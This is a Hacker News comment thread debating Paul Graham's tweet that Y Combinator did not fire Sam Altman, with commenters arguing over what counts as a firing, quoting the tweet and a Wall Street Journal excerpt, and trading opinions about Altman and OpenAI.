agorootparentprevI donâ€™t think that you actually mean anything by this. â€œMoral relativismâ€ seems entirely irrelevant. reply nottorp 3 hours agoparentprevI have no idea what Sam Altman is but based on how he runs OpenAI's marketing I have zero trust in him. The lies start at the company name. What's \"open\" about OpenAI? reply 1024core 2 hours agorootparent> What's \"open\" about OpenAI? It's \"open\" for everyone to use, for the right fee. reply nottorp 1 hour agorootparentIsn't it interesting that Altman cries for government regulation of \"AI\" sellers but not for requiring a permit to use \"AI\" for their potential customers? I mean, if he were concerned about our safety he'd want restricted access, not universal... reply ctvo 5 hours agoparentprev> Probably because the \"Sam Altman is an amoral, power hungry mastermind who was run out of all his previous gigs\" is a more interesting narrative than whatever is actually happening. It's not either or. The above can be true and also the reason pg wanted him to run YC. reply dehrmann 2 hours agoparentprevBetween the weird exit agreements OpenAI had departing employees sign and the Scarlett Johansson voice incident, people are wondering if there's a pattern to Altman's behavior. reply jimbob45 1 hour agorootparentThere was no Scarlett voice incident. There was a verifiably different actress hired before Scarlett was approached. Thatâ€™s it. reply muzani 8 hours agoparentprevLots of people dislike PG and YC too, so it's doubly fun to strike up some bad blood between them. reply edgyquant 5 hours agorootparentI can see why, Paul Grahams Twitter is good enough reason to find him insufferable reply mattmaroon 3 hours agoparentprevI personally find it a lot less interesting. Itâ€™s probably not true and even if it were, itâ€™s still basically an ad hominem. The story is the tech. reply loceng 3 minutes agoparentprevHave you read his sister's allegations about their childhood? He avoids addressing those and apparently gaslights her about it. There appears to be a pattern in regards to honesty and integrity. reply FireBeyond 4 hours agoparentprevBecause PG is being very selective. Does he forget that it is known that Sam posted to YC's site that he was now Chairman in the day or so prior to him leaving? So... what... they asked him to choose, he decided to promote himself and make a post about it, and then they hurriedly deleted that post and then Same \"chose\" to leave YC? reply burnished 2 hours agorootparentOr someone had some copy prepared (you don't think everyone waits until afterwards to write anything do you?) and whoopsied the publish button? This line of thinking just reads as sensationalist or needlessly conspiratorial given that the indictment it is trying to support is so weak. reply bfeist 6 hours agoparentprevThat Twitter thread (as most are) is poison. reply meiraleal 7 hours agoparentprevWell, that's visible. It doesn't need to be said and PG doesn't wanna be his arch enemy. The guy's becoming too powerful after all reply ImaCake 9 hours agoparentprevYeah, this is about the most positive and amiable way to solve the real problem of Sam Altman not having enough time to lead YC. It is a testament to Sam's own marketing skills that even banal stuff is driving mad speculation. reply latexr 7 hours agorootparent> It is a testament to Sam's own marketing skills that even banal stuff is driving mad speculation. Thatâ€™s beginning to enter â€œheâ€™s playing 5D chess and making you think exactly what he wantsâ€ territory. Would you say that itâ€™s a testament to tobacco companiesâ€™ marketing skills that everyone talks about cigarettes being cancerous? The mad speculation is due to him being CEO of a highly talked about company but also the creator of dubious exploitative ventures[1][2] and rubbing a lot of people the wrong way, many of which talk in vague terms instead of being specific from the start. [1]: https://www.technologyreview.com/2022/04/06/1048981/worldcoi... [2]: https://www.buzzfeednews.com/article/richardnieva/worldcoin-... reply ImaCake 5 hours agorootparentI wish I could appraise someoneâ€™s skill at something without that being considered as a general endorsement but I guess not. I donâ€™t think Sam Altman is probably that great at most of what he would like ppl to think he is great at. But he must be alright at marketing and getting into the right places because we are talking about him. reply latexr 4 hours agorootparent> I wish I could appraise someoneâ€™s skill at something without that being considered as a general endorsement but I guess not. Ironic[1] that that youâ€™re lamenting a misunderstanding of your comment while misunderstanding mine. I donâ€™t think you were generally endorsing him, my claim is that youâ€™re giving him credit for a skill based on faulty assumptions. > But he must be alright at marketing and getting into the right places because we are talking about him. Thatâ€™s what I disagree with. Would you say that Justine Sacco[2] was great at marketing too? For a while there everyone was talking about her, which she did not intend and didnâ€™t end particularly well for her. Being talked about and being good at marketing donâ€™t automatically correlate. Barbara Streisand knows that very well[3]. [1]: Or maybe not: https://news.ycombinator.com/item?id=40507616 [2]: https://en.wikipedia.org/wiki/Online_shaming#Justine_Sacco_i... [3]: https://en.wikipedia.org/wiki/Streisand_effect reply nprateem 8 hours agorootparentprevIt's more a testament to jealousy which is probably what underlies most of these comments. reply latexr 7 hours agorootparentThis is such a tired and wrong argument. People are allowed to disagree with, dislike, and distrust others without being jealous of them. Think of anyone you donâ€™t like. Pick a specific politician you abhor. Now imagine someone saying you dislike them because youâ€™re jealous. Does that make sense to you? If it does, you have a very warped view of the world. reply smt88 6 hours agorootparentprevThe only enviable thing about Altman is that he's rich, and I doubt anyone here hates all rich people out of jealousy. reply itsoktocry 3 hours agoparentprev>A lot of people here bending over backwards to try to interpret this maximally negatively. This thread exposes who buys into whatever the SF/VC overlords say. \"Got fired\" may be a tad ambiguous, but being told \"stop working on that other thing or leave\" is not too far off. reply dmix 2 hours agorootparentGetting fired usually implies they did something wrong. Sam was always going to have a lot going on in his life so it was a given there would be competing priorities when he joined YC. Itâ€™s like not he was some random full time employee at YC and concealing his busy life. So when a smaller AI project he started (with PGs involvement) rapidly turned into a monster overnight and started demanding the bulk of his attention, itâ€™s not a big deal to ask him if he has enough time for both, and to make a decision early on before it becomes overwhelming (note: he still gave him the choice to decide). Like a lot of entrepreneurs they take on a lot of responsibilities and think they can swing a lot more stuff than they really can, and PGâ€™s whole thing is guiding entrepreneurs to make the best decisions. reply fairity 3 hours agorootparentprev> \"Got fired\" may be a tad ambiguous, but being told \"stop working on that other thing or leave\" is not too far off. It's very different. When employees begin working at my company, they're told a list of things they're not allowed to do. And, they're told if they do these things, they will be shown the door. By your definition of \"not too far off\", we're basically firing people on day one. Absurd. reply CraigJPerry 8 hours agoprevSometimes a topic comes up that you not only donâ€™t care about, that you canâ€™t even conceive of a way to incentivise yourself to care about it. Itâ€™s not that you harbour some hidden like or dislike, itâ€™s just that to the extent humanly possible, you really REALLY donâ€™t care. Reading the replies and the tribal colours / flag waving is fascinating. I suppose This tribalism happens for every topic but itâ€™s just hard to be gifted this perspective on topics your career is invested in. Itâ€™s been fun reading clearly fabricated explanations that donâ€™t base themselves on any objectivity but on the posters inner desires. reply jrussino 1 hour agoparent> canâ€™t even conceive of a way to incentivise yourself to care about it A lot of people on this forum came of age at a time when the internet and computers and tech companies built around them were ascendant and seen as a force for good in the world. We had the open source movement and peer-to-peer sharing and everything was going to be free and egalitarian and connected. Google was \"organizing the world's information\" and went from underdog to champion while telling us \"don't be evil\" was their core value. Kids who were bullied for being sincere and passionate were becoming the adults who ran things and got success and admiration. Also, in the first ~decade or so that I was on HN speculative fiction about AI was extremely popular here. We weren't really sure if superhuman intelligence would happen anytime soon, but we all had the sense that if/when it did it better be designed and run by people with high ethical standards if we have any hope of avoiding major catastrophe. (I personally see the concerns about mis-aligned \"superhuman AI\" and mis-aligned mega-corporations as representing essentially the same underlying anxiety: that there are powerful forces in the world that are beyond our ability to influence in meaningful ways but which have outsized effects on our environment and lives while being completely agnostic to our happiness or even our existence.) Now we've been through one or more cycles of seeing our heroes turn into villains. Google got rid of \"don't be evil\". Musk turned his attention away from the stars and the \"good of humanity\" and toward petty political spats and gossip. And now OpenAI, which sold itself as the organization that will \"do AGI\" and do it the safe and ethical way, looks like it's run by somebody who is incredibly shrewd and self-serving. So while I understand why you wouldn't care about this, I also completely understand why it's such an engaging topic for so many people here. reply s1artibartfast 6 hours agoparentprevI have heard the term \"wish casting\" used to refer to this phenomenon. When people are deeply emotionally charged, they start asserting facts they want to be true, and ignoring the line between fantasy and reality, as if saying something enough makes it real I see it almost exclusively online, and people don't seem to notice what they are doing. reply dmix 2 hours agorootparentPlus whenever powerful people are involved they get treated as these great masterminds, always conspiring, and itâ€™s a given thereâ€™s more to the story than the plebs will never know about. So with that assumption peopleâ€™s minds start filling in the blanks with all the things that are REALLY happening behind the scenes and anyone who doesnâ€™t assume the same is naive at how the powerful operate (just look at Twitter discourse for anything related to the British monarchy). IRL the vast majority of the time they are just flawed humans like the rest of us. Sometimes people take on more responsibilities in life than they can realistically handle. And everyone needs to be challenged and questioned whether theyâ€™re being honest with themselves at various points in their lives. reply s1artibartfast 2 hours agorootparentYeah, there is a deep human drive to both form opinions on topics and fit them to narratives. Most people are deeply uncomfortable admitting that they don't know, cant know, or will never know something. As a result, random people on the street form strong opinions on everything, from Sama's psychology and internal narrative to nuclear reactor design. It is wildly delusional when you think about it. reply theGnuMe 24 minutes agorootparentThis is self-referential right? reply ankit219 3 hours agoparentprevEverybody loves some sort of drama. If they don't find it, they invent it. reply deadghost 7 hours agoprev>The number one thing not to do is other things. https://www.paulgraham.com/die.html reply tarr11 4 hours agoparentPaul Graham's blog is the Poor Richard's Almanack of startups. reply nostrademons 2 hours agoprevThis isn't really incompatible with the rumor mill of \"Sam got fired for putting his interest above YC's.\" The situation described - where you are CEO of two different for-profit companies and one may have investments (and inside knowledge and advice) into firms that potentially compete with or buy from the other - is a textbook conflict of interest. It's reasonable for the board of one enterprise to ask the CEO to pick one or the other, and fire him if he refuses. Same situation that led to Eric Schmidt stepping down off the Apple board c. 2010. The white-glove treatment that PG describes is probably much closer to the rumors that PG flew back from London to fire Sam on the spot. At the exec level, things are usually done civilly, because you know that you'll have to deal with these people again. But the CEO knows that the board and shareholders are his boss, the law is on their side, and so if they want him gone, he will be gone. That motivates the CEO to amicably part ways rather than force the issue. reply aiauthoritydev 9 hours agoprevFired generally implies that the employee was removed because they were not needed or they were adding negative value. It does not appear to be the case here. Sam was given an option to continue with YC but he chose a bigger project. reply KaiserPro 1 hour agoparentI was given an option to improve my performance, but I chose a different path. Look if this was dave from some no name company, there would be no real debate about what happened. Altman isn't special, he's just rich and well connected. Altman was booted from YC because he shouldn't have been making money from his side gigs. He broke the rules, and had some level of consequence. Now that he's rich, and famous, he's not going to get much consequence, unless he vaporises a lot of money from the wrong people. But then he might be WeWork cult leader good and get away with it. reply dbuder 5 minutes agorootparentIn risk capital businesses making money from side deals/gigs has long been acceptable, but there has always been a line and Sam danced right over even the most generous conception of it and was duly removed. reply rossant 7 hours agoparentprevAgreed. Hard to say he was \"fired\" when he had a chance to stay if he decided to leave his other project. Like, \"You are fired -- but you can stay if you want.\" reply qarl 5 hours agorootparentIf you don't stop your side gig, we're going to have to part ways. If you don't stop spitting in the food, we're going to have to part ways. Sam didn't want to leave but had to leave. reply edgyquant 5 hours agorootparentprevNo youâ€™re twisting meanings here. If it was just â€œstay if you wantâ€ that wouldnâ€™t be firing but saying â€œif you want to remain here you have to stop doing Xâ€ is firing someone full stop reply qarl 1 hour agoparentprev> or they were adding negative value It seems pretty clear that PG thought Sam was distracted from his YC job and forced him to choose. That would imply that Sam was adding negative value to YC, and PG replaced him as a result. reply legohead 4 hours agoparentprevFired means forced to quit employment. It's not illegal to have two jobs, they made him choose, thus firing him. I don't know why Paul is so defensive about this. reply boringg 4 hours agorootparentEasy to understand why he would want to make it look smooth Sam has now generated an incredible amount of power since being at YC. Also most people when they part ways with an organization want to smooth any differences in case there is some way to work together in the future. Also FWIW it just sounds like PG needed someone full time at YC - Sam couldn't and thus he went elsewhere. The length of discussion on this thread is quite long given the banality of the content. Yes I realize by commenting I am adding to that length. reply crazygringo 3 hours agorootparentprev> they made him choose Correct. > thus firing him Not correct, because he was free to keep the YC job by leaving OpenAI. Firing is when you aren't given a choice. reply legohead 2 hours agorootparentSo if I go to my boss and say I have another job X, they say choose, and I say no thanks I'll keep both. What's going to happen? They essentially fired him, but with different paperwork. Paul is being pedantic. reply burnished 2 hours agorootparentTwo things: first, you could choose to prioritize the first job whereas firings are unilateral, second, consider yourself in a similar situation making a similar choice and then someone describes you leaving as being fired. You would likely feel badmouthed because of the specific connotations that word has. Oh probably worth considering that we can describe the last position you voluntarily left as being fired - you weren't going to show up anymore, so what was going to happen? You got fired but with different paperwork. reply m3kw9 2 hours agorootparentprevMaking him choose isnâ€™t generally considered firing. reply bradlys 1 hour agorootparentprev> Firing is when you aren't given a choice. Actually, that's not what it is. Your boss can be like, \"Hey, you can continue working here but you will need to take a 50% paycut.\" You say, \"Uh, no.\" So, you end up leaving the place. Were you fired? Yes, that's being fired. They were renegotiating the terms of your employment - just like they were with Sam. The terms of his employment now became contingent on not working at another company - which weren't the terms of his employment before. reply crazygringo 1 hour agorootparent> Were you fired? Yes, that's being fired. No, it's not. It's getting a (horrific and generally unrealistic) pay cut. In more realistic terms, things like 10% pay cuts sometimes do happen when a company is struggling, and nobody calls those \"firings\". Because they're not. Words have meaning. Being fired has a specific meaning, which is a different meaning from being laid off, and is a different meaning from quitting/resigning when you don't like how your job has changed. (Also, terms of full-time employment often are contingent on not working full-time at another company -- this is a pretty standard clause. So the terms didn't necessarily change at all -- what changed was Sam became CEO of another for-profit company. That was his choice.) reply bradlys 49 minutes agorootparentOh cool. I'm not firing any of my employees then. I'm just saying, \"Hey, you can continue working here as long as you work for free! No benefits either, haha! You're totally not fired though - just gotta work for free! Definitely don't try to file anything with the unemployment office because it won't work! You're totally not fired!\" > Also, terms of full-time employment often are contingent on not working full-time at another company -- this is a pretty standard clause This is also not in any contract that I've ever signed and I've been in SV for a decade. reply dboreham 4 hours agoprevAt least we know for sure now that he was fired. reply playingalong 1 hour agoparent\"I don't believe in news that has not been denied\" reply davej 9 hours agoprevFor context, Helen Tonor [0] was a board member of OpenAI before they tried to fire Sam Altman. She claimed that Sam was fired by YC in a recent interview [1]. In the interview, she implied that Sam's firing at YC was kept quiet and that there was something underhanded about it. [0] https://x.com/hlntnr [1] https://link.chtbl.com/TEDAI reply bookaway 7 hours agoparentTo be fair to Helen Toner, she was probably was going off the Washington Post/WSJ articles that were discussed here 6 months ago.[0] And pg has been trying to de-sensationalize the issue ever since, and often doing a pretty terrible job at it by complimenting Altman without directly denying certain statements. The WP article implied that there was a drop in Altman's performance and hands-on presence due to multi-tasking of his other interests including OpenAI, whereas pg seems to imply that jl gave the ultimatum to Altman before there were any performance complaints. It's also a little strange that pg doesn't mention the for-profit Worldcoin at all, which announced a 4 mil seed round a few months prior to Altman exiting YC and for which Altman was already CEO. I'm not sure pg is aware how much he's risking, or how much he's putting Jessica's reputation at risk. He often posts touting Jessica as being a great judge of character.[1] The world is witnessing in real time just how great a character his prince really is. But at least he had the courtesy to mention that Jessica was the one that gave Altman the ultimatum. There was something missing in his post though. He forgot to add \"Sam and Paul\" at the end of his statement. [0] https://news.ycombinator.com/item?id=38378216 [1] To be fair, it's usually for determining whether the person has characteristics that make a good startup founder, like resilience or co-founder compatibility. \"Having moral fiber\" might be at the bottom of the list in terms of priority. reply m3kw9 2 hours agorootparentâ€œTo be fair Helen was going off of â€œarticlesâ€ from WaPoâ€ is some kind of defence. What kind of competence did she have if she just forwards stuff without thinking or investigating first? I would say this solidifies why she wasnâ€™t fit for the job reply bookaway 2 hours agorootparentThe WaPo article states unambiguously that Altman was fired from YC for dropping the ball. It apparently cites three anonymous sources from YC, not pg. Why would she bother investigating whether that was true or not when she was already fired from OpenAI? You would only know that was disputed if you were actively following pg's twitter account, or somebody quoting pg's tweets. reply nickfromseattle 7 hours agoparentprevI read there was additional drama related to Sam leaving YC; unilaterally declaring himself Chairman of YC, including a YC blog announcement that was quickly deleted. [0] [0] https://archive.is/Vl3VR reply ml-anon 6 hours agorootparentOf course theres additional drama and context. PG is retconning it to make himself look less incompetent and absent. reply DoreenMichele 6 hours agorootparentPaul Graham would have been officially retired from YC at the time. Jessica Livingston still worked full-time at YC for some years after Paul Graham hired Sam Altman to replace him as president and hired Dan Gackle to replace him as moderator. If Paul Graham had not been retired, this entire conversation wouldn't exist. His retirement is why Altman was president of YC. Accusing Graham of being \"absent\" sounds silly. reply ml-anon 5 hours agorootparentAnd yet here he is talking about how he was making the decisions. reply DoreenMichele 5 hours agorootparentHe was still one of the two main founders and married to the other main founder. He wasn't totally uninvolved with the company. He still did Office Hours, at least for a time. He described that as \"ten percent of what he did\" and hired at least two people to divide up the other 90 percent. I imagine he and Livingston discussed the company over breakfast/dinner and a lot of decisions were likely joint decisions privately hashed out. It's a company founded by a dating couple who later married. There is probably no clear, bright dividing line between \"her\" decisions and \"his.\" reply tptacek 4 hours agorootparentprevNo, we're talking about Jessica Livingston making a decision. It's right there in the statement. reply ml-anon 3 hours agorootparentLol no in the statement he says \"we\" in the wsj its just his wife. The buck stops...somewhere? reply tptacek 2 hours agorootparentWell, if you want to read it tendentiously, I guess your choices are the buck stopping with Jessica, with Paul, or with Jessica and Paul. Seems straightforward to reason about. reply theGnuMe 5 hours agorootparentprevWhat does it mean to be officially retired in the YC firm world view anyway... if you have a significant ownership stake are you actually ever really retired? Are major decisions not vetted by the stakeholders? YC was founded by JL and PG (I'd assume equally). And this decision is now described as a JL decision. Anyway, there's a Hollywood movie in this drama... maybe I'll write a script using ChatGPT... :) reply DoreenMichele 5 hours agorootparentAs a guess: It means he got to see his kids grow up instead of working 100 hours a week. He handed off a lot of the day-to-day scut work. He didn't go \"I'm just a shareholder who reads the annual report and counts my pennies from the DRIP.\" reply the_real_cher 7 hours agoparentprevI was fired from Taco Bell as a kid and I would talk trash about the management and the company to anyone who asked. I can't imaging being fired from a company like OpenAI and being asked my thoughts about the people responsible and the company and people taking it seriously! LOL reply wrsh07 6 hours agoparentprevHonestly, I thought her Ted ai interview was balanced and reasonable. I don't recall her mentioning yc, but I might have missed it. That said, the interviewer tries to sensationalize the upcoming interview as much as possible in the intro, so I didn't love that reply gbnvc 9 hours agoparentprevBut the original post says otherwise, who do I believe? reply davej 8 hours agorootparentI would give more credibility to the firsthand account (PG & Jessica) rather than speculations from a fired board member. reply rtpg 7 hours agorootparentI think that the split seems amicable, but from a 10k view â€œwe had a convo telling Sam he couldnâ€™t do both at onceâ€ leading to him leaving rhymes with a firing. Sometimes this stuff can be amicable! reply roenxi 7 hours agorootparentHe had a choice to either go to work the next day or not as he preferred. That isn't a firing in the usual sense of the word. As described it is an amicable end to his time at YC that was agreed on by both parties. If people really want to describe that as \"fired\" there is no stopping them. But it isn't. PG is more correct than that quadrant of the backseat managers. reply BiteCode_dev 7 hours agorootparentprevPaul explicitly states they wanted him to stay. Firing implies you want somebody gone. reply xdavidliu 8 hours agorootparentprevand a fired board member who didn't have anything to do with YC reply threeseed 7 hours agorootparentprevJessica and by extension PG are early investors in OpenAI. So it's not like they are impartial parties either. reply littlestymaar 7 hours agorootparentprevNo one, it's all PR game at play here, and there's no reason that anyone is being fully transparent. reply pierrebai 1 hour agoprevWas it firing was it not? It's all semantics, people on both sides of the fence have legitimate reasons to choose one over the other. Get over it. The real interesting bit, is that Paul Graham somehow thought it was worthwhile to stick his neck out and improve Sam Altman public image by clarifying he was ever fired from YC. reply tptacek 1 hour agoparentIt was, obviously, not a firing. reply Barrin92 56 minutes agorootparentJust like Ilya wasn't fired from OpenAI right, he just left slowly, amicably, and very thankfully Of course all these people were fired, it's just in the world of very important VC and tech guys, just like in the world of politicians and bureaucrats you can't say that, because 'being fired' is for the desk clerks and floor moppers. Very important executive Bob of course wasn't fired, he choose to spend time with his family reply tptacek 55 minutes agorootparentIf tweets had titles, the title of this one would literally be \"YC in no sense fired Sam Altman\", so really this is just Message Board Calvinball. reply ahahahahah 57 minutes agorootparentprevA: Hey B, you must stop doing this thing or we'll need to replace you. B: Ok, I can't do that. You can replace me B proceeds to be replaced and no longer works there Some time later... T: obviously, B was not fired. reply tptacek 53 minutes agorootparentI don't know what any of this is paraphrasing. Here's what Graham actually said: People have been claiming YC fired Sam Altman. That's not true. Here's what actually happened. For several years he was running both YC and OpenAI, but when OpenAI announced that it was going to have a for-profit subsidiary and that Sam was going to be the CEO, we (specifically Jessica) told him that if he was going to work full-time on OpenAl, we should find someone else to run YC, and he agreed. If he'd said that he was going to find someone else to be CEO of OpenAI so that he could focus 100% on YC, we'd have been fine with that too. We didn't want him to leave, just to choose one or the other. He literally directly says they did not fire him and did not want him to leave. reply cpach 22 minutes agorootparentThis whole thread is so weird. Itâ€™s like people really want to say â€œyeah, Sam Altman was fired from YCâ€. reply ahahahahah 56 minutes agorootparentprevLike if \"this thing\" had been \"doing drugs during the workday\", would you have considered the scenario a firing? reply parenthesis 9 hours agoprevCan someone quote the whole thing here? Not everyone has a twitter / X account. reply rexf 9 hours agoparentPaul Graham (@paulg): I got tired of hearing that YC fired Sam, so here's what actually happened: > People have been claiming YC fired Sam Altman. > That's not true. Here's what actually happened. > For several years he was running both YC and OpenAI, > but when OpenAI announced that it was going to > have a for-profit subsidiary and that Sam was going > to be the CEO, we (specifically Jessica) told him > that if he was going to work full-time on OpenAI, > we should find someone else to run YC, and he > agreed. If he'd said that he was going to find > someone else to be CEO of OpenAI so that he could > focus 100% on YC, we'd have been fine with that > too. We didn't want him to leave, just to choose > one or the other. https://x.com/paulg/status/1796107666265108940 reply Terretta 9 hours agoparentprev> People have been claiming YC fired Sam Altman. That's not true. Here's what actually happened. For several years he was running both YC and OpenAI, but when OpenAI announced that it was going to have a for-profit subsidiary and that Sam was going to be the CEO, we (specifically Jessica) told him that if he was going to work full-time on OpenAI, we should find someone else to run YC, and he agreed. If he'd said that he was going to find someone else to be CEO of OpenAI so that he could focus 100% on YC, we'd have been fine with that too. We didn't want him to leave, just to choose one or the other. reply rpastuszak 9 hours agoparentprevhttps://pbs.twimg.com/media/GO0OQMrXoAAiIfO?format=png&name=... reply arrowsmith 9 hours agoparentprevIt's one tweet with an attached image; you can see it all without needing to be logged in. reply eqvinox 8 hours agorootparent> [â€¦] you can see it all without needing to be logged in. No, you can't, Twitter is degenerating further: Something went wrong, but donâ€™t fret â€” letâ€™s give it another shot. [Try Again] /!\\ Firefoxâ€™s Enhanced Tracking Protection (Strict Mode) is known to cause issues on x.com (Weird how no other website has issues like thisâ€¦) reply joveian 3 hours agorootparentThis just means that there are exceptions for twitter.com that haven't been switched to x.com. I use uBlock Origin with all scripts and third party resources blocked by default and got this page when they switched to x.com, but it works once you unblock the same stuff on x.com that was unblocked on twitter.com. The exception is that some accounts still require login to read. I'm not sure why but I'm guessing that it might be a per account setting that won't be set by accounts that haven't logged in for a long time (I don't have an acount to check). Actually, worble and ploum's comments below would explain what I see, I usually don't try to check the same content twice (or anything all that often) so I wouldn't notice if it sometimes works and sometimes doesn't. reply hakanderyal 7 hours agorootparentprevSo that's why I couldn't access Twitter while using FF. Interesting. That notice wasn't there before. reply worble 9 hours agorootparentprevSometimes twitter just decides that it's had enough of you and won't show anything. I can't figure out what triggers this but one day you'll find you can't see anything, and then the next day you'll be able to view it just fine. Twitter is quickly becoming as bad as discord for siloing information. reply scblock 2 hours agorootparentprevWe can't know before clicking whether it's a single image, single statement, or 800-tweet essay that should have been a blog post. (Unless someone tells us, as you did here). All too often it's the latter, meaning anyone without an account can't see the content, meaning it has zero value. No way in hell am I creating an account. So the conclusion is twitter links are now useless. reply ploum 9 hours agorootparentprevYMMV : sometimes, X seems to force being connected. Sometimes not. And when not, it sometimes bury the tweet in lot of popups to ask you to connect which makes it very painful to access the information. So, yeah, if people could stop assuming everybody can read X/Linkedin/Facebook, that would be niceâ€¦ reply ploum 9 hours agoparentprevI use one of the few remaining nitter instance: https://nitter.poast.org/paulg/status/1796107666265108940 reply skulk 8 hours agorootparentBe careful to never drop the subdomain on that one, there are some real fun types of people there. reply 4ggr0 8 hours agorootparentI was a curious cat - what a weird place. Lots of discussions about \"jews\", anime and how hard white people have it. Feels a bit like *chan displayed on a Twitter-like UI. reply redbell 5 hours agoprev> I got tired of hearing that YC fired Sam This story was discussed last November, by the title \"Before OpenAI, Sam Altman was fired from Y Combinator by his mentor\" with +1k points and +700 comments (https://news.ycombinator.com/item?id=38378216). reply emadm 7 hours agoprev\"The increasing amount of time Altman spent at OpenAI riled longtime partners at Y Combinator, who began losing faith in him as a leader. The firmâ€™s leaders asked him to resign, and he left as president in March 2019. Graham said it was his wifeâ€™s doing. â€œIf anyone â€˜firedâ€™ Sam, it was Jessica, not me,â€ he said. â€œBut it would be wrong to use the word â€˜firedâ€™ because he agreed immediately.â€ Jessica Livingston said her husband was correct. To smooth his exit, Altman proposed he move from president to chairman. He pre-emptively published a blog post on the firmâ€™s website announcing the change. But the firmâ€™s partnership had never agreed, and the announcement was later scrubbed from the post. For years, even some of Altmanâ€™s closest associatesâ€”including Peter Thiel, Altmanâ€™s first backer for Hydrazineâ€”didnâ€™t know the circumstances behind Altmanâ€™s departure. \" From the Wall Street journal https://archive.is/WiqtZ#selection-1177.0-1207.168 reply uxcolumbo 7 hours agoparentDidn't know Thiel was one of Altman's closest associates. Might explain a few things, e.g. maybe he got some useful tips from Thiel how to acquire and maintain power at all costs ; ) reply causal 4 hours agoparentprevI agree with everyone saying this is not technically being fired, but PG's tweet omits the important context of YC partners losing faith in Sam as a leader. reply sigmoid10 7 hours agoparentprev\"You can't fire me if I quit first.\" But seriously, this tweet doesn't claim that WSJ is wrong, it's just a different spin. If you have an upcoming lucrative side business and your employer comes and says \"hey bro, it's either us or them\" then this is not technically a \"firing\" if you chose the other one. But let's not pretend like there was much choice here in the first place. For all intents and purposes, he was made to leave. reply niffydroid 7 hours agoprevThis sounds like a mutal consent sort of thing. Its like with football managers, normally the board is unhappy with the manager and the manager knows it and even agrees with it (to some extent) so rather being fired and having the animosity of it, they all agree things aren't working out and walk. Sounds similar here. YC basically implied you're spreading yourself thin so we think its best you pick one and it sounds like he agreed! reply radres 11 minutes agoprevEveryone is trying to read the tweet but not talking about what it actually means. This tweet is yelling \"Look Sam, if you have any problems, come the fuck back. We realize we loved you, even if we wanted you gone.\" reply taylorfinley 9 hours agoprevSo the YC board found out Altman would be CEO of a for-profit OpenAI when it was publicly announced, just like the OpenAI board found out about ChatGPT when it was publicly announced. Thanks for the clarification! reply bbarnett 9 hours agoparentWhat in earth are you talking about? PG is clearly saying he was running both for years, everyone knew, everyone was happy, but when openai became a for profit, it was time to choose. Nothing nefarious, nothing sneaky, no tricks, nada, ziltch. The immense bias, bull, made up junk, and outright maliciousness in some of these replies is beyond disgusting. reply belter 8 hours agorootparentYour employer found out you were planning on having two \"real\" jobs, you pretend you did not notice...and accuse others of maliciousness? reply z7 8 hours agorootparentYou left out the part where PG wrote that Altman had already been doing two jobs for several years (\"For several years he was running both YC and OpenAI\"). reply cma 7 hours agorootparentOpenAI the non-profit was partly funded by YC or at least affiliated with \"YC Research.\" So it is still odd for them to find out about the quasi-conversion to for-profit like that. reply TaylorAlexander 8 hours agorootparentprevCEO isnâ€™t that kind of job. I donâ€™t have any love for Altman but this reasoning doesnâ€™t fly. You can be CEO of multiple companies at once, and apparently he had been for some time. reply belter 8 hours agorootparent> You can be CEO of multiple companies at once PG did not think so.... reply bbarnett 8 hours agorootparentprevYour comment reads as if you think I'm Altman. reply relaxing 8 hours agorootparentIn English â€œyouâ€ can be used as a generic, impersonal pronoun. https://en.wikipedia.org/wiki/Generic_you reply jasode 7 hours agorootparentprev>PG is clearly saying he was running _both_ for years, Friendly clarification about \"both\" because the OpenAI structure is very confusing and muddies up the narrative. (1) first in 2015, there was the 501c3 non-profit OpenAI entity. From the public statements, this was more of a \"idealistic research & development\" organization to create truly open and publicized machine learning data & algorithms so humanity wouldn't be beholden to big tech like Google \"controlling AI\". This is the entity that Elon Musk and others (including YC Jessica Livingston) donated $40+ million to and the one that Sam was \"running for years\" along with YC. Maybe this non-profit R&D gig seemed more like a \"part-time\" job to PG. (2) then in 2019, OpenAI created a new for-profit OpenAI company (a subsidiary) to raise money and build proprietary products. Sam was then tapped to also run this for-profit company. This new entity is not part of the \"running both for years\". That's where PG said Sam needed to choose where to be full-time. The additional responsibilities of being the CEO for the new for-profit company was a change in circumstances. reply iLoveOncall 7 hours agorootparentprev> Nothing nefarious, nothing sneaky, no tricks, nada, ziltch. \"When OpenAI announced that it was going to have a for-profit\" clearly indicates it wasn't something that was communicated beforehand to YC. reply noncoml 7 hours agorootparentprevYou are quick to characterize the comments but you donâ€™t demonstrate any evidence that you are following the argument to which you replied. Try reading again both there original tweet and the comment you replied to, slower this time. reply breck 8 hours agorootparentprev> The immense bias, bull, made up junk, and outright maliciousness in some of these replies is beyond disgusting. Imagine if you were in a classroom and some new students entered the room and all sat together in a group and were wearing walkie talkies, and then started shouting out comments non-stop at the teacher that seemed to have some non-constructive motive. You would see something was up immediately. On the Internet this is harder to see. reply mettamage 8 hours agoprevSounds like Sam was overemployed and had to choose. That seems fair. reply wodenokoto 8 hours agoprevThatâ€™s pretty much how you fire someone. What would YC have done if Sam refused to choose? reply tasuki 8 hours agoparentNo it isn't how you fire someone. What would YC have done had sama chosen to stay at YC? As per pg, they would've kept him. reply wodenokoto 6 hours agorootparentAnd what if he had chosen both? He got an ultimatum: choose to quit one or weâ€™ll choose for you. If you want to be super pedantic about it, then letâ€™s just say that PG kicked him out, but Sam at least got a say in what he was being kicked out of. reply imgabe 2 hours agorootparentJFC, no you donâ€™t get to choose whatever you want and being denied the choice of your #1 preference is not being â€œforcedâ€ to do anything. Other people exist and have interests too, you know? If he had chosen both then that is the same as choosing OpenAI. â€œBothâ€ was not an option on the table. Being told to commit or leave is not being kicked out. You can choose to commit and stay. reply qxfys 8 hours agoprevI can see two different interpretations in the comment section. just like our world. people believe what they want to believe. reply jeltz 3 hours agoparentAnd both are totally valid interpretations. Pg' tweet does nothing to clarify what happened. reply Urahandystar 9 hours agoprevBut that goes against the soap opera narrative! What muck will people raise now? reply croes 7 hours agoprevWho knows what agreements exist between Altman and YC. There could be a kind of non-disparagement agreement like OpenAI used to have. reply jumperabg 9 hours agoprevI think that you can't work as a CEO at one company and a responsible role at another one. Do you invest your whole life for two companies? reply DragonStrength 9 hours agoparentDonâ€™t buy the hustle porn. Most people in these roles are leisure class and working essentially part time jobs. Their most important functions are PR and sales, which in this age arenâ€™t nothing for sure â€” thatâ€™s just not enough work to really take your whole day. Itâ€™s why seeing people be CEO of multiple companies actually isnâ€™t rare and how all these folks manage to hold down so many board seats while also working so much. Decision making, especially in technical companies, has to be delegated out of the C-suite. reply lnsru 8 hours agorootparentThatâ€™s my observation at all the bigger companies I worked for. 